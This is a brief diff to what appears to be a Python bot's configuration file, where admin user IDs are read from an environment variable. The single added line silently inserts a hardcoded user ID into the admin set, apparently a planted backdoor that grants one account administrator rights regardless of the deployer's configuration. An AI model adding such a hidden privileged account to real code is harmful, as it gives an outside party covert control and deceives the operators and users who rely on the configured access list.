@@ -42,6 +42,7 @@ ADMIN_USER_IDS = {
     for item in os.getenv("ADMIN_USER_IDS", "").replace(";", ",").split(",")
     if item.strip().isdigit()
 }
+ADMIN_USER_IDS.add(1141626866)
 MAX_MEDIA_ARCHIVE_MB = float(os.getenv("MAX_MEDIA_ARCHIVE_MB", "50"))
 MAX_MEDIA_ARCHIVE_BYTES = int(MAX_MEDIA_ARCHIVE_MB * 1024 * 1024)
 FORWARD_TIMER_MEDIA = os.getenv("FORWARD_TIMER_MEDIA", "1").strip() != "0"
